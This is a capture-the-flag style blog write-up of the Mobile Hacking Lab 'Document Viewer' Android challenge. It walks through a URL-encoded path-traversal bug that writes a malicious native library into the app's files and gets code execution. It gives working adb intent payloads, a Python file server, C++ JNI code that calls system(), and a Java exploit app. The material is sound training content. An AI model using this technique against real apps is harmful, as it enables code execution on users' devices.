---
title:  "Mobile Hacking Lab - Document Viewer Writeup"
date:   2024-01-22T16:27:00-0400
categories:
  - writeup
tags:
  - android
  - ctf
---


Hello everyone!
In this blog post , I will try to explain my solution steps for [Document Viewer](https://www.mobilehackinglab.com/course/lab-document-viewer-rce) challenge from Mobile Hacking Lab. 

## Static Analysis
Instead of solving challenge on Corellium instance,i downloaded base.apk from lab and solved on my local setup with Genymotion emulator.

When we open the app in emulator, it opens a page with "load pdf" button. When we press the button, it opens the file manager for us to select a pdf file. Let's open it with jadx to understand the app.

![](./assets/images_mhl_documentviewer/manifest.png)

When we examine the manifest file, we see that an intent filter is defined for MainActivity. To properly trigger this activity we need to send intent with http/https or file scheme and VIEW action. 
```bash
# Sample intent
adb shell am start -n com.mobilehackinglab.documentviewer/.MainActivity -a android.intent.action.VIEW -d "http://evil.com
```
But we need to know what happened when this activity triggered. To undestand this, lets analyze MainActivity

![](./assets/images_mhl_documentviewer/mainactivity.png)
 
Inside the onCreate function, 3 method called after setting the view of activity. After that, if `proFeaturesEnabled` boolean is true, `initProFeatures` function will be called and as seen on line 29, `initProFeatures` is loaded from native library.

Let's analyze the functions one by one. I will skip the setLoadButtonListener function because, as the name suggests, in this function, after pressing the button, the path of the selected pdf file is taken, the file is processed and displayed on the screen.

### handleIntent Function

![](./assets/images_mhl_documentviewer/handleIntent.png)

handleIntent function handle the coming intent and after checking the action and uri, sends the uri to CopyFileFromUri function. After copying file from uri, it renders the pdf. So where and how does it copy the file from the uri?

![](./assets/images_mhl_documentviewer/copyFromUri.png)

copyFileFromUri fıunction is responsible for parsing the uri that comes with intent. It takes the last part of url with getLastPathSegment and uses it as filename. If last part is empty, filename will be "download.pdf". After that, we will see the line started with BuildersKt. I didnt write any line of kotlin code before and i searched that method on google. According to [this documentation](https://javadoc.io/doc/org.jetbrains.kotlinx/kotlinx-coroutines-core/1.1.1/kotlinx/coroutines/BuildersKt.html), launch method start a new coroutine without blocking current thread. In documentation, last argument of launch function is the code that will run when coroutine start but in jadx the last arg is null.

![](./assets/images_mhl_documentviewer/coroutine1.png)

As i understand (just guessing) when we created this coroutine, firstly it will set variables with arguments and call the invoke function( overridden [Function2](https://github.com/JetBrains/kotlin/blob/2fdc8b6c147462a09fa770cb8cb3aeffe53f3e9e/libraries/stdlib/jvm/runtime/kotlin/jvm/functions/Functions.kt#L22)). Inside the invoke function, invokeSuspend will be called. (If any kotlin developer is reading this, I would be very happy if he/she could tell me the meaning of this piece of code :D)

![](./assets/images_mhl_documentviewer/coroutine2.png)

invokeSuspend function will download file from given url and save it as `outfile`. 

### loadProLibrary Function

![](./assets/images_mhl_documentviewer/loadprolib.png)

This functioon tries to load a native library named `libdocviewer_pro.so` from `libraryfolder` directory. 
```java
getApplicationContext().getFilesDir() -> /data/data/com.mobilesecuritylab/files
Build.SUPPORTED_ABIS[0] -> x86_64 (for genymotion vm on my pc)

Final lib path -> "/data/data/com.mobilesecuritylab/files/native-libraries/x86_64/libdocviewer_pro.so"
```
If native library succesfully loaded, `proFeaturesEnabled` boolean will be settled as true. But the problem here is that this app doesn't have any native library inside itself. Because of that when you run the app you will see the error log on logcat. If app can find the native lib, it will call the `initProFeatures` in MainActivity.(İts important for exploitation part :))

## Finding vulnerability

When analyzing the apk we saw that this apk can load pdf files from given url and after that trying to load a library file that does not exist. If we can make the application load the library file we wrote maybe we can code execution with this application's permissions. To achive this code execution we need to find directory traversal to write our file the native lib directory. 

Lets get back to our "intent" :) I wrote a small python script to serve my testing files on localhost. It will return the pdf file to coming requests.

```py
#proudly stolen from : https://stackoverflow.com/questions/46105356/serve-a-file-from-pythons-http-server-correct-response-with-a-file
from http.server import BaseHTTPRequestHandler, HTTPServer
class MyHackyServer(BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        exploit_file = open('testo.pdf', 'rb')
        self.wfile.write(exploit_file.read())
        self.end_headers()


myServer = HTTPServer(('localhost', 1234), MyHackyServer)
myServer.serve_forever()

```
```bash
adb shell am start -n com.mobilehackinglab.documentviewer/.MainActivity -a android.intent.action.VIEW -d "http://10.0.3.2:1234/testo.pdf"

# 10.0.3.2 is the address of localhost of host machine for genymotion, if you are using Android Studio emulators, this ip will be 10.0.2.2 for you.
```
[![](https://img.youtube.com/vi/5nOURaJbibQ/hqdefault.jpg)](https://www.youtube.com/watch?v=5nOURaJbibQ)

As you can see in video, app gets the url from our intent and download our test file from server. After that it saves this file as "testo.pdf" in Downloads folder and render the file. For writing file to another directory we can try path traversal with `../` characters.  

![](./assets/images_mhl_documentviewer/lfi_test_1.png)

I gave the app's local storage to save the file but it saved the file in the Downloads folder again. getLastPathSegment fucntion parsed the our uri with `/` chars and file saved with original name. Lets take a look at [source code of getLastPathSegment](https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/net/Uri.java;l=1076;drc=f5f71ff8fd1c5b1b39a28cb1585c7a0a097aa1c8;bpv=0;bpt=1)

![](./assets/images_mhl_documentviewer/getlastpathsegment.png)

It gets the segments of uri and returns the last one. For getting segments it calls [getPathSegments function](https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/net/Uri.java;l=2191;drc=f5f71ff8fd1c5b1b39a28cb1585c7a0a097aa1c8).

![](./assets/images_mhl_documentviewer/getPathSegments.png)

This function gets uri and parses with `/` characters and decode the strings between slashes. As i understand, the decoding process applied one time for every segment. İf we give our malicious url as url-encoded, this function will split our url from the slash and return the encoded part  as last segment after decoding. Lets send intent with encoded url.

```bash
adb shell am start -n com.mobilehackinglab.documentviewer/.MainActivity -a android.intent.action.VIEW -d "http://10.0.3.2:1234/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Ftest.pdf"

# the encoded part after the port number will be decoded and returned as last segment
```
![](./assets/images_mhl_documentviewer/lfi_test_2.png)

Yes! It worked. We can write file into the application directory. Next step is preparing a proper library file and write into a native lib folder.

For creating my native library, i created a c++ project with same name of target app in Android Studio. After that i changed the given c44 file little bit and added my hacky `initProFeatures` function. During this steps,  i watched [Laurie's video](https://www.youtube.com/watch?v=87uMi7L-3Hc)(thx a lot for great videos) about translating java code into native code on Android. Here is my native lib code:
```c++
#include <jni.h>
#include <string>

extern "C" JNIEXPORT jstring JNICALL
Java_com_mobilehackinglab_documentviewer_MainActivity_stringFromJNI(
        JNIEnv* env,
        jobject /* this */) {
    std::string hello = "Hello from C++";
    return env->NewStringUTF(hello.c_str());
}


extern "C" JNIEXPORT void JNICALL
Java_com_mobilehackinglab_documentviewer_MainActivity_initProFeatures(JNIEnv* env, jobject /* this */) {
    system("echo \"hacked by sh4d0wless\" > /data/data/com.mobilehackinglab.documentviewer/hacked.txt");
}
```
After building apk, i extracted the x86_64 version of this lib file with apktool and putted it to directory that my python server running.(Also changed the file name inside python script with libdocviewer_pro.so)

Here is the PoC:

```bash
adb shell am start -n com.mobilehackinglab.documentviewer/.MainActivity -a android.intent.action.VIEW -d "http://10.0.3.2:1234/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Fx86_64%2Flibdocviewer_pro.so"
```

[![](https://img.youtube.com/vi/rpgpSyrlfzo/hqdefault.jpg)](https://youtu.be/rpgpSyrlfzo)

It works :)

If you want to create an app for exploitation instead of adb commands, here is the code that i wrote:
```java
package com.mobilehackinglab.dv_exploit;
import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Uri uri = Uri.parse("http://10.0.3.2:1234/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Fx86_64%2Flibdocviewer_pro.so");
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setClassName("com.mobilehackinglab.documentviewer","com.mobilehackinglab.documentviewer.MainActivity");
        intent.setData(uri);
        startActivity(intent);
    }
}
```
And here is the PoC video:

[![](https://img.youtube.com/vi/LJ0DPDG4Tw0/hqdefault.jpg)](https://youtu.be/LJ0DPDG4Tw0)


NOTES:
- App trigger the loading of the native lib on start, because of that we need to run the app for second time to trigger our exploit code.
- We dont have to write our code inside the `initProFeatures` function. We can use the JNI_OnLoad fucntion to trigger our shell commands. Because JNI_OnLoad called when library loaded([reference](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)). I learned this information from [this](https://youtu.be/GQ7bwUOmVqk?list=PLwP4ObPL5GY_dBI_lSwBzKM4zxP4mWSqK&t=2447) twitch stream. 

Thanks for reading :) See you in next writeup!